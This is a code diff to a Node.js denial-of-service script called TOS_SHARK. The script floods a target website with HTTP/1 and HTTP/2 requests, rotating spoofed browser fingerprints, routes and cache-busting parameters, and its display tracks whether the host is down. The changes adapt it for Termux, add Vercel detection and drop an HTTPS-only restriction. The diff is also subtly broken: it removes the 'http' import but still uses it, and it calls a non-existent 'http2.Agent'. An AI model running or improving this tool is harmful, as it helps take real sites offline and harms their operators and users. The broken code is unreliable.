@@ -1,5 +1,4 @@
 const http2 = require('http2');
-const http = require('http');
 const https = require('https');
 const { URL } = require('url');
 
@@ -7,6 +6,7 @@ class TOS_SHARK {
     constructor(targetUrl) {
         const url = new URL(targetUrl);
         this.hostname = url.hostname;
+        this.isHttps = url.protocol === 'https:';
         this.path = url.pathname || '/';
         this.targetUrl = targetUrl;
         
@@ -28,7 +28,6 @@ class TOS_SHARK {
         // H2 Connection Pool
         this.h2Connections = [];
         this.h2MaxConnections = 15;
-        this.h2ActiveStreams = 0;
         
         // H1 Agent
         this.h1Agent = null;
@@ -37,7 +36,7 @@ class TOS_SHARK {
         this.fingerprints = this.generateFingerprints();
         this.currentFingerprint = 0;
         this.routes = ['/', '/api', '/static', '/admin', '/data', '/users'];
-        this.methods = ['GET', 'HEAD', 'POST'];
+        this.methods = ['GET', 'HEAD'];
         this.headerSets = this.generateHeaderSets();
         
         // Initialize
@@ -46,6 +45,7 @@ class TOS_SHARK {
 
     // ===== PROTECTION DETECTION =====
     detectProtection() {
+        if (this.hostname.includes('vercel.app')) return 'VERCEL';
         return 'CUSTOM';
     }
 
@@ -139,12 +139,11 @@ class TOS_SHARK {
     // ===== ATTACK ENGINE =====
     generateFingerprints() {
         const prints = [];
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 20; i++) {
             prints.push({
                 userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.${i}`,
-                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                language: 'en-US,en;q=0.9',
-                encoding: 'gzip, deflate, br'
+                accept: '*/*',
+                language: 'en-US,en;q=0.9'
             });
         }
         return prints;
@@ -152,13 +151,11 @@ class TOS_SHARK {
 
     generateHeaderSets() {
         const sets = [];
-        for (let i = 0; i < 20; i++) {
+        for (let i = 0; i < 10; i++) {
             sets.push({
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'accept': '*/*',
                 'accept-language': 'en-US,en;q=0.9',
-                'accept-encoding': 'gzip, deflate, br',
-                'cache-control': 'no-cache',
-                'pragma': 'no-cache'
+                'cache-control': 'no-cache'
             });
         }
         return sets;
@@ -169,43 +166,16 @@ class TOS_SHARK {
         console.log(this.color(`Target: ${this.hostname}`, 'yellow'));
         console.log(this.color('Initializing attack engine...', 'green'));
         
-        // Setup connections
-        this.setupH2Connections();
-        this.h1Agent = new http.Agent({
-            keepAlive: true,
-            maxSockets: 100,
-            maxFreeSockets: 50,
-            timeout: 5000
-        });
+        // Setup H1 agent
+        this.h1Agent = this.isHttps ? 
+            new https.Agent({ keepAlive: true, maxSockets: 50 }) :
+            new http2.Agent({ keepAlive: true, maxSockets: 50 });
         
         // Start systems
         setTimeout(() => {
             this.startAttackCycle();
             this.startDisplay();
-        }, 2000);
-    }
-
-    setupH2Connections() {
-        for (let i = 0; i < this.h2MaxConnections; i++) {
-            setTimeout(() => {
-                try {
-                    const client = http2.connect(this.targetUrl, {
-                        maxSessionMemory: 32768
-                    });
-                    client.setMaxListeners(1000);
-                    client.on('error', () => {});
-                    this.h2Connections.push(client);
-                } catch (err) {}
-            }, i * 100);
-        }
-    }
-
-    resetH2Connections() {
-        this.h2Connections.forEach(client => {
-            try { client.destroy(); } catch (err) {}
-        });
-        this.h2Connections = [];
-        this.setupH2Connections();
+        }, 1000);
     }
 
     getRandomRoute() {
@@ -226,49 +196,51 @@ class TOS_SHARK {
     }
 
     async sendH2Request() {
-        if (this.h2Connections.length === 0) return null;
+        if (!this.isHttps) return { status: 'ERROR', duration: 0 };
         
         const startTime = Date.now();
-        const client = this.h2Connections[Math.floor(Math.random() * this.h2Connections.length)];
         this.requestCounter++;
         
         try {
-            const method = this.getRandomMethod();
-            const route = this.getRandomRoute();
-            const headers = this.getRandomHeaders();
-            
-            const h2Headers = {
-                ':method': method,
-                ':path': `${route}?_=${Date.now()}&r=${this.requestCounter}`,
-                ':authority': this.hostname,
-                ...headers
-            };
+            // Create new H2 connection each time (simpler for Termux)
+            const client = http2.connect(this.targetUrl);
             
             return new Promise((resolve) => {
                 const timeout = setTimeout(() => {
+                    client.destroy();
                     resolve({ status: 'TIMEOUT', duration: 5 });
                 }, 5000);
                 
-                const req = client.request(h2Headers);
+                const method = this.getRandomMethod();
+                const route = this.getRandomRoute();
+                const headers = this.getRandomHeaders();
                 
-                if (method === 'POST') {
-                    req.write('');
-                }
+                const h2Headers = {
+                    ':method': method,
+                    ':path': `${route}?_=${Date.now()}`,
+                    ':authority': this.hostname,
+                    ...headers
+                };
+                
+                const req = client.request(h2Headers);
                 
                 req.on('response', (responseHeaders) => {
                     clearTimeout(timeout);
                     const duration = (Date.now() - startTime) / 1000;
                     const status = responseHeaders[':status'];
+                    client.destroy();
                     resolve({ status, duration });
                 });
                 
                 req.on('error', (err) => {
                     clearTimeout(timeout);
                     const duration = (Date.now() - startTime) / 1000;
+                    client.destroy();
                     resolve({ status: 'ERROR', duration });
                 });
                 
                 req.end();
+                
             });
             
         } catch (err) {
@@ -287,15 +259,16 @@ class TOS_SHARK {
             
             const options = {
                 hostname: this.hostname,
-                port: 443,
                 path: `${this.getRandomRoute()}?h1=${Date.now()}`,
                 method: 'GET',
-                agent: this.h1Agent,
                 headers: { 'Connection': 'close' },
                 timeout: 5000
             };
             
-            const req = https.request(options, (res) => {
+            // Use HTTPS for https:// targets
+            const requestModule = this.isHttps ? https : http;
+            
+            const req = requestModule.request(options, (res) => {
                 clearTimeout(timeout);
                 const duration = (Date.now() - startTime) / 1000;
                 resolve({ status: res.statusCode, duration });
@@ -318,35 +291,36 @@ class TOS_SHARK {
     }
 
     async sendH3Request() {
+        // Same as H1 for now
         return this.sendH1Request();
     }
 
     async startAttackCycle() {
+        console.log(this.color('[+] Starting attack cycle', 'green'));
+        
         while (this.running) {
             const now = Date.now();
             
-            // Phase switching
+            // Phase switching - simpler timing
             if (now >= this.nextPhaseChange) {
                 if (this.phase === 'H2_ATTACK') {
                     this.phase = 'H1_H3_PHASE';
-                    const h1Duration = 19000 + Math.random() * 3000;
-                    this.nextPhaseChange = now + h1Duration;
+                    this.nextPhaseChange = now + 20000; // 20s H1/H3 phase
                     this.phaseStart = now;
-                    this.resetH2Connections();
                 } else {
                     this.phase = 'H2_ATTACK';
-                    const h2Duration = 120000 + Math.random() * 100000;
-                    this.nextPhaseChange = now + h2Duration;
+                    this.nextPhaseChange = now + 120000; // 120s H2 attack
                     this.phaseStart = now;
                 }
             }
             
             // Execute requests based on phase
             let result;
-            if (this.phase === 'H2_ATTACK') {
+            if (this.phase === 'H2_ATTACK' && this.isHttps) {
                 result = await this.sendH2Request();
                 this.totalRequests++;
             } else {
+                // H1/H3 phase
                 if (Math.random() < 0.8) {
                     result = await this.sendH1Request();
                 } else {
@@ -366,8 +340,8 @@ class TOS_SHARK {
                 }
             }
             
-            // Small delay
-            await new Promise(resolve => setTimeout(resolve, 0.1));
+            // Small delay to prevent Termux crash
+            await new Promise(resolve => setTimeout(resolve, 10));
         }
     }
 
@@ -394,12 +368,12 @@ class TOS_SHARK {
             console.log(this.color('-----------------------------------------------------------------', 'cyan'));
             console.log(`Total Requests: ${this.color(this.totalRequests.toLocaleString(), 'green')}`);
             console.log(`Request #: ${this.requestCounter}`);
-            console.log(`H2 Connections: ${this.h2Connections.length}`);
+            console.log(`Protocol: ${this.isHttps ? 'HTTPS' : 'HTTP'}`);
             console.log(`Host Status: ${this.isHostDown ? this.color('DOWN', 'red') : this.color('UP', 'green')}`);
             console.log(this.color('-----------------------------------------------------------------', 'cyan'));
             
             // Calculate RPS
-            const rps = this.totalRequests / (runtime / 1000);
+            const rps = this.totalRequests > 0 ? this.totalRequests / (runtime / 1000) : 0;
             console.log(`Average RPS: ${this.color(rps.toFixed(1), 'green')}`);
             
             setTimeout(display, 1000);
@@ -410,11 +384,6 @@ class TOS_SHARK {
 
     stop() {
         this.running = false;
-        // NO FINAL STATS - just exit
-        this.h2Connections.forEach(client => {
-            try { client.destroy(); } catch (err) {}
-        });
-        if (this.h1Agent) this.h1Agent.destroy();
         process.exit(0);
     }
 }
@@ -427,11 +396,6 @@ if (require.main === module) {
     }
     
     const target = process.argv[2];
-    if (!target.startsWith('https://')) {
-        console.log('Error: Target must use HTTPS');
-        process.exit(1);
-    }
-    
     const shark = new TOS_SHARK(target);
     
     process.on('SIGINT', () => {
